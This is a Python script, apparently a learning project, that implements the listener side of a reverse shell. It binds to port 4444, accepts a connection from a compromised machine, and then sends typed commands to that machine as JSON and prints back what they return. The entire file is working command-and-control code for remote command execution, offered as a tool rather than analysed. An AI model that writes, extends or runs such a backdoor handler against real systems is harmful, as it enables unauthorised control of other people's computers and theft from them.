#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444.
# General - json is used to manage serilisation to receive large data.


import socket, json


class Listr:
    def __init__(self, addr, prt):
        listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The bellow is to reuse a connection if it doesn't go down with the connection to.
        listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(addr)
        listr.bind((addr, prt))
        listr.listen(0)
        print("\n[+] Waiting for incoming connection.\n") #testing
        self.conn, addrs = listr.accept()
        print("[+] Got a connection from " + str(addrs) + "\n") #testing

    def send_data(self, data):
        print("\ntype: " + str(type(data)) + " - data: " + data + "\n") #testing
        json_data = json.dumps(data)
        print("\ntype: " + str(type(json_data)) + " - json_data: " + json_data + "\n") #testing
        self.conn.send(json_data.encode())

    def rcve_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def exe_rmy(self, comm):
        self.send_data(comm)
        return self.rcve_data()

    def run(self):
        while True:
            comm = input('=[ $ ')
            print(self.exe_rmy(comm))
            if "exit" in comm:
                self.conn.close()
                break
        

my_listner = Listr('', 4444)
my_listner.run()